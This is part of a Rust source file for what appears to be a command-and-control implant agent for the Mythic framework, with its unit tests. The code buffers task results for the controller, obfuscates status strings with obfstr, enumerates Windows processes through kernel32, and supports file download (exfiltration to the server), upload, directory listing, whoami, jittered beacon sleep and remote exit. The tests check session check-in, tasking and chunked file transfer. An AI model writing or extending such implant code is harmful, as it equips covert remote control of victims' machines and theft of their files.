            upload_metas: [UploadItemMeta::new(); MAX_RESPONSE_SLOTS],
            file_browser_metas: [FileBrowserMeta::new(); MAX_RESPONSE_SLOTS],
            process_metas: [ProcessBrowserMeta::new(); MAX_RESPONSE_SLOTS],
            file_entries_cache: [EMPTY_FILE_ENTRY; MAX_FILES_PER_SLOT],
            file_browser_slot: None,
            proc_entries_cache: [EMPTY_PROC_ENTRY; MAX_PROCESSES_PER_SLOT],
            proc_browser_slot: None,
            count: 0,
        }
    }

    pub fn clear(&mut self) {
        if self.output_len > 0 {
            crate::buffer::zeroize_slice(&mut self.output_buf[..self.output_len]);
        }
        self.output_len = 0;
        self.count = 0;
        self.download_metas = [DownloadItemMeta::new(); MAX_RESPONSE_SLOTS];
        self.upload_metas = [UploadItemMeta::new(); MAX_RESPONSE_SLOTS];
        self.file_browser_metas = [FileBrowserMeta::new(); MAX_RESPONSE_SLOTS];
        self.process_metas = [ProcessBrowserMeta::new(); MAX_RESPONSE_SLOTS];
        self.file_entries_cache = [EMPTY_FILE_ENTRY; MAX_FILES_PER_SLOT];
        self.file_browser_slot = None;
        self.proc_entries_cache = [EMPTY_PROC_ENTRY; MAX_PROCESSES_PER_SLOT];
        self.proc_browser_slot = None;
    }

    pub fn record_response(
        &mut self,
        task_id: &str,
        output: &str,
        success: bool,
        completed: bool,
    ) -> bool {
        if self.count >= MAX_RESPONSE_SLOTS
            || task_id.len() > 36
            || self.output_len.saturating_add(output.len()) > self.output_buf.len()
        {
            return false;
        }

        let idx = self.count;
        self.task_ids[idx][..task_id.len()].copy_from_slice(task_id.as_bytes());
        self.task_id_lens[idx] = task_id.len();

        let start = self.output_len;
        let end = start + output.len();
        self.output_buf[start..end].copy_from_slice(output.as_bytes());
        self.output_offsets[idx] = start;
        self.output_lens[idx] = output.len();
        self.output_len = end;

        self.is_success[idx] = success;
        self.is_completed[idx] = completed;
        self.download_metas[idx] = DownloadItemMeta::new();
        self.upload_metas[idx] = UploadItemMeta::new();
        self.file_browser_metas[idx] = FileBrowserMeta::new();
        self.process_metas[idx] = ProcessBrowserMeta::new();
        if self.file_browser_slot == Some(idx) {
            self.file_browser_slot = None;
        }
        if self.proc_browser_slot == Some(idx) {
            self.proc_browser_slot = None;
        }
        self.count += 1;
        true
    }

    pub fn record_download_response(
        &mut self,
        task_id: &str,
        download: FileDownloadResponse<'_>,
        output: &str,
        success: bool,
        completed: bool,
    ) -> bool {
        if self.count >= MAX_RESPONSE_SLOTS || task_id.len() > 36 {
            return false;
        }
        let idx = self.count;
        if !self.record_response(task_id, output, success, completed) {
            return false;
        }

        let mut meta = DownloadItemMeta::new();
        meta.is_set = true;
        meta.total_size = download.total_size;
        meta.chunk_offset = download.chunk_offset;
        meta.is_screenshot = download.is_screenshot;
        meta.resume = download.resume;

        if let Some(fid) = download.file_id {
            let flen = fid.len().min(36);
            meta.file_id[..flen].copy_from_slice(&fid.as_bytes()[..flen]);
            meta.file_id_len = flen;
        }

        if let Some(cdata) = download.chunk_data {
            let start = self.output_len;
            let end = start + cdata.len();
            if end <= self.output_buf.len() {
                self.output_buf[start..end].copy_from_slice(cdata.as_bytes());
                self.output_len = end;
                meta.chunk_data_offset = start;
                meta.chunk_data_len = cdata.len();
            }
        }

        if let Some(path) = download.full_path {
            let start = self.output_len;
            let end = start + path.len();
            if end <= self.output_buf.len() {
                self.output_buf[start..end].copy_from_slice(path.as_bytes());
                self.output_len = end;
                meta.full_path_offset = start;
                meta.full_path_len = path.len();
            }
        }

        if let Some(fname) = download.filename {
            let start = self.output_len;
            let end = start + fname.len();
            if end <= self.output_buf.len() {
                self.output_buf[start..end].copy_from_slice(fname.as_bytes());
                self.output_len = end;
                meta.filename_offset = start;
                meta.filename_len = fname.len();
            }
        }

        self.download_metas[idx] = meta;
        true
    }

    pub fn record_upload_response(
        &mut self,
        task_id: &str,
        upload: FileUploadRequest<'_>,
        output: &str,
        success: bool,
        completed: bool,
    ) -> bool {
        if self.count >= MAX_RESPONSE_SLOTS || task_id.len() > 36 {
            return false;
        }
        let idx = self.count;
        if !self.record_response(task_id, output, success, completed) {
            return false;
        }

        let mut meta = UploadItemMeta::new();
        meta.is_set = true;
        meta.chunk_size = upload.chunk_size;
        meta.chunk_num = upload.chunk_num;

        let flen = upload.file_id.len().min(36);
        meta.file_id[..flen].copy_from_slice(&upload.file_id.as_bytes()[..flen]);
        meta.file_id_len = flen;

        if let Some(path) = upload.full_path {
            let start = self.output_len;
            let end = start + path.len();
            if end <= self.output_buf.len() {
                self.output_buf[start..end].copy_from_slice(path.as_bytes());
                self.output_len = end;
                meta.full_path_offset = start;
                meta.full_path_len = path.len();
            }
        }

        self.upload_metas[idx] = meta;
        true
    }

    /// 由 `emit_file_browser` 调用的写入接口
    #[allow(clippy::too_many_arguments)]
    pub fn record_file_browser_from_parts(
        &mut self,
        task_id: &str,
        name: &str,
        parent_path: &str,
        is_file: bool,
        size: u64,
        access_time: u64,
        modify_time: u64,
        names: &[[u8; 260]],
        names_len: &[usize],
        entries_meta: &[(bool, u64, u64, u64)],
    ) -> bool {
        if self.count >= MAX_RESPONSE_SLOTS || task_id.len() > 36 {
            return false;
        }
        let idx = self.count;
        if !self.record_response(task_id, "", true, true) {
            return false;
        }

        let mut meta = FileBrowserMeta::new();
        meta.is_set = true;
        meta.is_file = is_file;
        meta.success = true;
        meta.size = size;
        meta.access_time = access_time;
        meta.modify_time = modify_time;

        let ns = self.output_len;
        let ne = ns + name.len();
        if ne > self.output_buf.len() {
            return false;
        }
        self.output_buf[ns..ne].copy_from_slice(name.as_bytes());
        self.output_len = ne;
        meta.name_offset = ns;
        meta.name_len = name.len();

        let ps = self.output_len;
        let pe = ps + parent_path.len();
        if pe > self.output_buf.len() {
            return false;
        }
        self.output_buf[ps..pe].copy_from_slice(parent_path.as_bytes());
        self.output_len = pe;
        meta.parent_path_offset = ps;
        meta.parent_path_len = parent_path.len();

        let buf_base = self.output_buf.as_mut_ptr();
        let cap = self.output_buf.len();
        let n_entries = names.len().min(MAX_FILES_PER_SLOT).min(entries_meta.len());

        let mut written = 0usize;
        for k in 0..n_entries {
            let n_len = names_len[k].min(names[k].len());
            let ns = self.output_len;
            let ne = ns + n_len;
            if ne > cap {
                break;
            }
            self.output_buf[ns..ne].copy_from_slice(&names[k][..n_len]);
            self.output_len = ne;

            let name_ref: &'static str = unsafe {
                let slice = core::slice::from_raw_parts(buf_base.add(ns), n_len);
                core::str::from_utf8_unchecked(slice)
            };

            let (is_f, atime, mtime, sz) = entries_meta[k];
            self.file_entries_cache[k] = crate::commands::file::build_file_browser_child(
                is_f,
                name_ref,
                atime,
                mtime,
                sz,
                None,
            );
            written += 1;
        }
        meta.file_count = written;
        self.file_browser_metas[idx] = meta;
        self.file_browser_slot = Some(idx);
        true
    }

    /// 由 `emit_process_browser` 调用的写入接口
    #[allow(clippy::too_many_arguments)]
    pub fn record_process_response_from_parts(
        &mut self,
        task_id: &str,
        host: Option<&str>,
        os: &str,
        update_deleted: bool,
        names: &[[u8; 260]],
        names_len: &[usize],
        pids: &[u32],
        ppids: &[u32],
    ) -> bool {
        if self.count >= MAX_RESPONSE_SLOTS || task_id.len() > 36 {
            return false;
        }
        let idx = self.count;
        if !self.record_response(task_id, "", true, true) {
            return false;
        }

        let mut meta = ProcessBrowserMeta::new();
        meta.is_set = true;
        meta.update_deleted = update_deleted;

        if let Some(h) = host {
            let hs = self.output_len;
            let he = hs + h.len();
            if he > self.output_buf.len() {
                return false;
            }
            self.output_buf[hs..he].copy_from_slice(h.as_bytes());
            self.output_len = he;
            meta.host_offset = hs;
            meta.host_len = h.len();
        }

        let os_s = self.output_len;
        let os_e = os_s + os.len();
        if os_e > self.output_buf.len() {
            return false;
        }
        self.output_buf[os_s..os_e].copy_from_slice(os.as_bytes());
        self.output_len = os_e;
        meta.os_offset = os_s;
        meta.os_len = os.len();

        let buf_base = self.output_buf.as_mut_ptr();
        let cap = self.output_buf.len();
        let n_entries = names
            .len()
            .min(MAX_PROCESSES_PER_SLOT)
            .min(names_len.len())
            .min(pids.len())
            .min(ppids.len());

        let mut written = 0usize;
        for k in 0..n_entries {
            let n_len = names_len[k].min(names[k].len());
            let ns = self.output_len;
            let ne = ns + n_len;
            if ne > cap {
                break;
            }
            self.output_buf[ns..ne].copy_from_slice(&names[k][..n_len]);
            self.output_len = ne;

            let name_ref: &'static str = unsafe {
                let slice = core::slice::from_raw_parts(buf_base.add(ns), n_len);
                core::str::from_utf8_unchecked(slice)
            };

            self.proc_entries_cache[k] = ProcessItem {
                process_id: pids[k],
                name: name_ref,
                parent_process_id: if ppids[k] != 0 { Some(ppids[k]) } else { None },
                architecture: None,
                bin_path: None,
                user: None,
                command_line: None,
                integrity_level: None,
                start_time: None,
                description: None,
                signer: None,
                protected_process_level: None,
            };
            written += 1;
        }
        meta.process_count = written;
        self.process_metas[idx] = meta;
        self.proc_browser_slot = Some(idx);
        true
    }

    #[inline]
    fn status_success() -> &'static str {
        static CELL: std::sync::OnceLock<[u8; 7]> = std::sync::OnceLock::new();
        let bytes = CELL.get_or_init(|| {
            obfstr::obfstr!(let s = "success";);
            let mut b = [0u8; 7];
            b.copy_from_slice(s.as_bytes());
            b
        });
        match core::str::from_utf8(bytes) {
            Ok(s) => s,
            Err(_) => "",
        }
    }

    #[inline]
    fn status_error() -> &'static str {
        static CELL: std::sync::OnceLock<[u8; 5]> = std::sync::OnceLock::new();
        let bytes = CELL.get_or_init(|| {
            obfstr::obfstr!(let s = "error";);
            let mut b = [0u8; 5];
            b.copy_from_slice(s.as_bytes());
            b
        });
        match core::str::from_utf8(bytes) {
            Ok(s) => s,
            Err(_) => "",
        }
    }

    pub fn build_items<'a>(
        &'a self,
        out_vec: &mut crate::buffer::StackVec<TaskResponseItem<'a>, 16>,
    ) {
        out_vec.clear();
        for i in 0..self.count {
            let tid = core::str::from_utf8(&self.task_ids[i][..self.task_id_lens[i]]).unwrap_or("");
            let start = self.output_offsets[i];
            let end = start + self.output_lens[i];
            let out_str = core::str::from_utf8(&self.output_buf[start..end]).unwrap_or("");
            let status = if self.is_success[i] {
                Self::status_success()
            } else {
                Self::status_error()
            };
            let mut item = TaskResponseItem::new(tid, out_str, self.is_completed[i])
                .with_status(status);

            if self.download_metas[i].is_set {
                let meta = &self.download_metas[i];
                let file_id_str = if meta.file_id_len > 0 {
                    core::str::from_utf8(&meta.file_id[..meta.file_id_len]).ok()
                } else {
                    None
                };
                let chunk_data_str = if meta.chunk_data_len > 0 {
                    core::str::from_utf8(
                        &self.output_buf
                            [meta.chunk_data_offset..meta.chunk_data_offset + meta.chunk_data_len],
                    )
                    .ok()
                } else {
                    None
                };
                let full_path_str = if meta.full_path_len > 0 {
                    core::str::from_utf8(
                        &self.output_buf
                            [meta.full_path_offset..meta.full_path_offset + meta.full_path_len],
                    )
                    .ok()
                } else {
                    None
                };
                let filename_str = if meta.filename_len > 0 {
                    core::str::from_utf8(
                        &self.output_buf
                            [meta.filename_offset..meta.filename_offset + meta.filename_len],
                    )
                    .ok()
                } else {
                    None
                };
                item.download = Some(FileDownloadResponse {
                    total_size: meta.total_size,
                    chunk_size: None,
                    full_path: full_path_str,
                    host: None,
                    filename: filename_str,
                    is_screenshot: meta.is_screenshot,
                    file_id: file_id_str,
                    chunk_offset: meta.chunk_offset,
                    chunk_data: chunk_data_str,
                    resume: meta.resume,
                });
            }

            if self.upload_metas[i].is_set {
                let meta = &self.upload_metas[i];
                let file_id_str = core::str::from_utf8(&meta.file_id[..meta.file_id_len])
                    .unwrap_or("");
                let full_path_str = if meta.full_path_len > 0 {
                    core::str::from_utf8(
                        &self.output_buf
                            [meta.full_path_offset..meta.full_path_offset + meta.full_path_len],
                    )
                    .ok()
                } else {
                    None
                };
                item.upload = Some(FileUploadRequest {
                    chunk_size: meta.chunk_size,
                    file_id: file_id_str,
                    chunk_num: meta.chunk_num,
                    full_path: full_path_str,
                });
            }

            if self.file_browser_metas[i].is_set {
                let meta = &self.file_browser_metas[i];
                let name_str = core::str::from_utf8(
                    &self.output_buf[meta.name_offset..meta.name_offset + meta.name_len],
                )
                .unwrap_or("");
                let parent_str = core::str::from_utf8(
                    &self.output_buf
                        [meta.parent_path_offset..meta.parent_path_offset + meta.parent_path_len],
                )
                .unwrap_or("");

                let files_slice: &'a [FileBrowserChildItem<'a>] = if self.file_browser_slot == Some(i) && meta.file_count > 0 {
                    let ptr = self.file_entries_cache.as_ptr()
                        as *const FileBrowserChildItem<'a>;
                    unsafe { core::slice::from_raw_parts(ptr, meta.file_count) }
                } else {
                    &[]
                };

                item.file_browser = Some(crate::commands::file::build_file_browser_response(
                    name_str,
                    parent_str,
                    meta.is_file,
                    meta.size,
                    meta.access_time,
                    meta.modify_time,
                    meta.success,
                    files_slice,
                ));
            }

            if self.process_metas[i].is_set {
                let meta = &self.process_metas[i];
                let host_str = if meta.host_len > 0 {
                    core::str::from_utf8(
                        &self.output_buf[meta.host_offset..meta.host_offset + meta.host_len],
                    )
                    .unwrap_or("")
                } else {
                    ""
                };
                let os_str = core::str::from_utf8(
                    &self.output_buf[meta.os_offset..meta.os_offset + meta.os_len],
                )
                .unwrap_or("");

                let procs_slice: &'a [ProcessItem<'a>] = if self.proc_browser_slot == Some(i) && meta.process_count > 0 {
                    let ptr = self.proc_entries_cache.as_ptr() as *const ProcessItem<'a>;
                    unsafe { core::slice::from_raw_parts(ptr, meta.process_count) }
                } else {
                    &[]
                };

                item.processes = Some(ProcessBrowserResponse {
                    host: host_str,
                    os: os_str,
                    update_deleted: Some(meta.update_deleted),
                    processes: procs_slice,
                });
            }

            let _ = out_vec.push(item);
        }
    }

    pub fn len(&self) -> usize {
        self.count
    }

    pub fn is_empty(&self) -> bool {
        self.count == 0
    }
}

#[cfg(windows)]
//  Rust 默认强制开启代码风格检查#[warn(nonstandard_style)]，要求结构体字段名必须使用蛇形小写命名.这里为了枚举系统进程树，我们手写了对接 Windows 内核kernel32.dll 的 C 结构体 PROCESSENTRY32W。为了严格对齐微软官方 C头文件及内存布局（对齐、大小），字段沿用了微软传统的匈牙利/驼峰命名法。Rust编译器无法自动感知这是手写 FFI 结构体，因此抛出警告.使用下面这个属性消除该警告
#[allow(clippy::upper_case_acronyms, non_snake_case)]
mod win32 {
    pub type BOOL = i32;
    pub type HANDLE = *mut core::ffi::c_void;
    pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
    pub const TH32CS_SNAPPROCESS: u32 = 0x00000002;

    #[repr(C)]
    pub struct PROCESSENTRY32W {
        pub dwSize: u32,
        pub cntUsage: u32,
        pub th32ProcessID: u32,
        pub th32DefaultHeapID: usize,
        pub th32ModuleID: u32,
        pub cntThreads: u32,
        pub th32ParentProcessID: u32,
        pub pcPriClassBase: i32,
        pub dwFlags: u32,
        pub szExeFile: [u16; 260],
    }

    #[link(name = "kernel32")]
    unsafe extern "system" {
        pub fn GetCurrentDirectoryW(nBufferLength: u32, lpBuffer: *mut u16) -> u32;
        pub fn SetCurrentDirectoryW(lpPathName: *const u16) -> BOOL;
        pub fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> HANDLE;
        pub fn Process32FirstW(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32W) -> BOOL;
        pub fn Process32NextW(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32W) -> BOOL;
        pub fn CloseHandle(hObject: HANDLE) -> BOOL;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_agent_session_lifecycle() {
        let master_key = [0x42u8; 32];
        let payload_uuid = *b"11111111-2222-3333-4444-555555555555";
        let mut session = AgentSession::new(&master_key, &payload_uuid).expect("create session");

        assert_eq!(session.active_uuid_str(), "11111111-2222-3333-4444-555555555555");
        assert!(!session.is_registered());

        session.update_sleep(10, 20);
        let s = session.calculate_jittered_sleep();
        assert!((8..=12).contains(&s));

        let mut ws = ActiveStackWorkspace::new();
        let mut sys_ws = SysInfoWorkspace::new();
        let b64_len = session.build_checkin_payload(&mut ws, &mut sys_ws).expect("build checkin");
        assert!(b64_len > 0);

        assert_eq!(
            session.build_get_tasking_payload(None, &mut ws).unwrap_err(),
            WisconsinError::Agent(AgentError::NotCheckedIn)
        );

        let callback_uuid = "88888888-7777-6666-5555-444444444444";
        let checkin_resp_json = format!(
            r#"{{"action":"checkin","status":"success","id":"{}"}}"#,
            callback_uuid
        );

        let http = HttpProfile::new("", "", session.active_uuid_str(), &session.crypto);
        let mut srv_ws = ActiveStackWorkspace::new();
        let srv_b64_len = http
            .pack_bytes(checkin_resp_json.as_bytes(), &mut srv_ws.raw_buf, &mut srv_ws.b64_buf)
            .expect("server pack");

        let parsed = session
            .handle_checkin_response(&srv_ws.b64_buf[..srv_b64_len], &mut ws.raw_buf)
            .expect("handle checkin resp");

        assert_eq!(parsed.status, "success");
        assert!(session.is_registered());
        assert_eq!(session.active_uuid_str(), callback_uuid);

        let tasking_b64_len = session
            .build_get_tasking_payload(None, &mut ws)
            .expect("build get_tasking");
        assert!(tasking_b64_len > 0);
    }

    #[test]
    fn test_task_dispatch_and_execution_workspace() {
        let master_key = [0x42u8; 32];
        let payload_uuid = *b"11111111-2222-3333-4444-555555555555";
        let mut session = AgentSession::new(&master_key, &payload_uuid).expect("create session");
        let mut exec_ws = TaskExecutionWorkspace::new();

        let sleep_task = crate::protocol::MythicTaskRef::new("task-sleep", "sleep", "15 25");
        session.dispatch_task(&sleep_task, &mut exec_ws);
        assert_eq!(session.sleep_interval(), 15);
        assert_eq!(session.sleep_jitter(), 25);
        assert_eq!(exec_ws.len(), 1);

        let pwd_task = crate::protocol::MythicTaskRef::new("task-pwd", "pwd", "");
        session.dispatch_task(&pwd_task, &mut exec_ws);
        assert_eq!(exec_ws.len(), 2);

        let whoami_task = crate::protocol::MythicTaskRef::new("task-whoami", "whoami", "");
        session.dispatch_task(&whoami_task, &mut exec_ws);
        assert_eq!(exec_ws.len(), 3);

        let ls_task = crate::protocol::MythicTaskRef::new("task-ls", "ls", ".");
        session.dispatch_task(&ls_task, &mut exec_ws);
        assert_eq!(exec_ws.len(), 4);

        let ps_task = crate::protocol::MythicTaskRef::new("task-ps", "ps", "");
        session.dispatch_task(&ps_task, &mut exec_ws);
        assert_eq!(exec_ws.len(), 5);

        let unk_task = crate::protocol::MythicTaskRef::new("task-unk", "invalid_cmd", "");
        session.dispatch_task(&unk_task, &mut exec_ws);
        assert_eq!(exec_ws.len(), 6);

        {
            let mut items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
            exec_ws.build_items(&mut items);
            assert_eq!(items.len(), 6);
            assert_eq!(items[0].task_id, "task-sleep");
            assert_eq!(items[0].status, Some("success"));
            assert_eq!(items[3].task_id, "task-ls");
            assert!(items[3].file_browser.is_some(), "ls 应产生结构化 file_browser 对象");
            assert_eq!(items[4].task_id, "task-ps");
            assert!(items[4].processes.is_some(), "ps 应产生结构化 processes 对象");
            assert_eq!(items[5].task_id, "task-unk");
            assert_eq!(items[5].status, Some("error"));
        }

        let exit_task = crate::protocol::MythicTaskRef::new("task-exit", "exit", "");
        session.dispatch_task(&exit_task, &mut exec_ws);
        assert!(session.should_exit());

        assert_eq!(extract_param(r#"{"path":"C:\\temp"}"#, "path"), r#"C:\\temp"#);
        assert_eq!(extract_param(r#"{"interval":10,"jitter":25}"#, "interval"), "10");
        assert_eq!(extract_param(r#"{"interval":10,"jitter":25}"#, "jitter"), "25");
        assert_eq!(extract_param(r#"C:\temp"#, "path"), r#"C:\temp"#);

        let sleep_json_task = crate::protocol::MythicTaskRef::new(
            "task-sleep-json",
            "sleep",
            r#"{"interval": 20, "jitter": 30}"#,
        );
        session.dispatch_task(&sleep_json_task, &mut exec_ws);
        assert_eq!(session.sleep_interval(), 20);
        assert_eq!(session.sleep_jitter(), 30);

        let dl_task = crate::protocol::MythicTaskRef::new(
            "task-dl",
            "download",
            r#"{"file_path": "Cargo.toml"}"#,
        );
        session.dispatch_task(&dl_task, &mut exec_ws);
        assert!(session.active_download.is_some());

        let ul_task = crate::protocol::MythicTaskRef::new(
            "task-ul",
            "upload",
            r#"{"file": "11111111-2222-3333-4444-555555555555", "remote_path": "target\\temp_ul.bin"}"#,
        );
        session.dispatch_task(&ul_task, &mut exec_ws);
        assert!(session.active_upload.is_some());

        let mut items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
        exec_ws.build_items(&mut items);
        assert_eq!(items.len(), 10);
        assert!(items[8].download.is_some());
        assert_eq!(items[8].task_id, "task-dl");
        assert!(items[9].upload.is_some());
        assert_eq!(items[9].task_id, "task-ul");
    }

    #[test]
    fn test_engine_file_transfer_coupling() {
        let master_key = [0x42u8; 32];
        let payload_uuid = *b"11111111-2222-3333-4444-555555555555";
        let mut session = AgentSession::new(&master_key, &payload_uuid).expect("create session");
        let mut exec_ws = TaskExecutionWorkspace::new();
        let mut ws = ActiveStackWorkspace::new();

        let dl_task = crate::protocol::MythicTaskRef::new(
            "task-dl-2",
            "download",
            r#"{"file_path": "Cargo.toml"}"#,
        );
        session.dispatch_task(&dl_task, &mut exec_ws);
        assert!(session.active_download.is_some());

        {
            let mut items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
            exec_ws.build_items(&mut items);
            assert_eq!(items.len(), 1);
            let dl_resp = items[0].download.expect("download registration must be present");
            assert!(dl_resp.total_size.is_some());
            assert!(dl_resp.filename.is_some());
        }

        let srv_file_id = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee";
        let ack_item = ServerTaskPostResponseItem {
            task_id: "task-dl-2",
            status: "success",
            file_id: Some(srv_file_id),
            ..Default::default()
        };
        session.handle_server_post_responses(&[ack_item]);
        let dl_state = session.active_download.expect("download state still exists");
        assert!(dl_state.is_registered);
        assert_eq!(dl_state.file_id_str(), Some(srv_file_id));

        exec_ws.clear();
        session.step_file_transfers(&mut exec_ws, &mut ws);
        {
            let mut chunk_items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
            exec_ws.build_items(&mut chunk_items);
            assert_eq!(chunk_items.len(), 1);
            let chunk_resp = chunk_items[0].download.expect("chunk payload must be present");
            assert_eq!(chunk_resp.file_id, Some(srv_file_id));
            assert!(chunk_resp.chunk_data.is_some());
            assert_eq!(chunk_resp.chunk_offset, Some(0));
        }

        let _ = std::fs::remove_file("target\\test_ul.txt");
        exec_ws.clear();
        let ul_task = crate::protocol::MythicTaskRef::new(
            "task-ul-2",
            "upload",
            r#"{"file": "99999999-8888-7777-6666-555555555555", "remote_path": "target\\test_ul.txt"}"#,
        );
        session.dispatch_task(&ul_task, &mut exec_ws);
        assert!(session.active_upload.is_some());

        {
            let mut ul_items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
            exec_ws.build_items(&mut ul_items);
            assert_eq!(ul_items.len(), 1);
            let ul_req = ul_items[0].upload.expect("upload request must be present");
            assert_eq!(ul_req.chunk_num, 1);
            assert_eq!(ul_req.file_id, "99999999-8888-7777-6666-555555555555");
        }

        let test_data_b64 = "SGVsbG8gTXl0aGlj"; // "Hello Mythic"
        let ul_ack = ServerTaskPostResponseItem {
            task_id: "task-ul-2",
            status: "success",
            file_id: Some("99999999-8888-7777-6666-555555555555"),
            chunk_num: Some(1),
            total_chunks: Some(1),
            chunk_data: Some(test_data_b64),
            ..Default::default()
        };
        session.handle_server_post_responses(&[ul_ack]);
        let ul_state = session.active_upload.expect("upload state");
        assert!(ul_state.is_complete);

        let written = std::fs::read_to_string("target\\test_ul.txt").expect("read uploaded file");
        assert_eq!(written, "Hello Mythic");
        let _ = std::fs::remove_file("target\\test_ul.txt");
    }

    #[test]
    fn test_extract_param_advanced_edge_cases() {
        let collision_json = r#"{"file_path":"first.bin","path":"second.bin"}"#;
        assert_eq!(extract_param(collision_json, "file_path"), "first.bin");
        assert_eq!(extract_param(collision_json, "path"), "second.bin");

        let val_contain_json = r#"{"comment":"the path is safe","path":"real_path.txt"}"#;
        assert_eq!(extract_param(val_contain_json, "path"), "real_path.txt");

        let missing_json = r#"{"interval":10}"#;
        assert_eq!(extract_param(missing_json, "path"), "");
        assert_eq!(extract_param(missing_json, "jitter"), "");

        let spaced_json = r#"{"path" : "C:\\spaced\\dir"}"#;
        assert_eq!(extract_param(spaced_json, "path"), r#"C:\\spaced\\dir"#);

        assert_eq!(extract_param(r#""C:\Program Files\App""#, "path"), r#"C:\Program Files\App"#);
        assert_eq!(extract_param("", "path"), "");
    }

    #[test]
    fn test_active_upload_short_id_slice_safety() {
        let ul = ActiveUpload::new("task-short", "short-uuid", "C:\\temp\\file.bin", 4096);
        assert_eq!(ul.task_id_str(), "task-short");
        assert_eq!(ul.file_id_str(), "short-uuid");
        assert_eq!(ul.path_str(), "C:\\temp\\file.bin");
        assert_eq!(ul.file_id_str().len(), 10);
    }

    #[test]
    fn test_workspace_zeroization() {
        let mut ws = TaskExecutionWorkspace::new();
        assert!(ws.is_empty());
        ws.record_response("task-sec", "sensitive memory data", true, true);
        assert_eq!(ws.len(), 1);
        ws.clear();
        assert_eq!(ws.len(), 0);
        assert_eq!(&ws.output_buf[..21], &[0u8; 21]);
    }

    #[test]
    fn test_ls_and_ps_produce_structured_objects() {
        let master_key = [0x42u8; 32];
        let payload_uuid = *b"11111111-2222-3333-4444-555555555555";
        let mut session = AgentSession::new(&master_key, &payload_uuid).expect("create session");
        let mut exec_ws = TaskExecutionWorkspace::new();

        let ls_task = crate::protocol::MythicTaskRef::new("task-ls-2", "ls", r#"{"path": "."}"#);
        session.dispatch_task(&ls_task, &mut exec_ws);

        {
            let mut items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
            exec_ws.build_items(&mut items);
            assert_eq!(items.len(), 1);
            let fb = items[0].file_browser.expect("file_browser must exist");
            assert!(fb.success);
            assert!(!fb.name.is_empty());
            let files = fb.files;
            assert!(!files.is_empty(), "目录枚举结果不应为空");
        } // items + fb + files 借用在此结束

        exec_ws.clear();
        let ps_task = crate::protocol::MythicTaskRef::new("task-ps-2", "ps", "");
        session.dispatch_task(&ps_task, &mut exec_ws);

        {
            let mut items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
            exec_ws.build_items(&mut items);
            assert_eq!(items.len(), 1);
            let pb = items[0].processes.expect("processes must exist");
            #[cfg(windows)]
            assert_eq!(pb.os, "windows");
            // 验证系统进程列表确实被 CreateToolhelp32Snapshot 枚举填充
            assert!(!pb.processes.is_empty(), "进程列表不应为空");
            // 仅在列表未被 MAX_PROCESSES_PER_SLOT 截断时才强断当前 PID 存在
            // （系统进程数可能超过 32 导致当前进程被排在截断线之外）
            if pb.processes.len() < MAX_PROCESSES_PER_SLOT {
                let cur_pid = std::process::id();
                let found_self = pb.processes.iter().any(|p| p.process_id == cur_pid);
                assert!(found_self, "进程列表应包含当前进程 PID={}", cur_pid);
            }
        }
    }

    #[test]
    fn test_exec_ws_not_cleared_on_parse_failure() {
        // 模拟：若 parse_tasking_response 失败，exec_ws 不应被清空，
        // 从而保证已投递但未获服务器确认的回执不会永久丢失。
        let mut exec_ws = TaskExecutionWorkspace::new();
        exec_ws.record_response("task-a", "payload-a", true, true);
        exec_ws.record_response("task-b", "payload-b", true, true);
        assert_eq!(exec_ws.len(), 2);

        // 若在此处发生解析失败，按修复后的逻辑不应调用 clear()，
        // 因此上述两条回执仍然保留。
        assert_eq!(exec_ws.len(), 2);
    }
}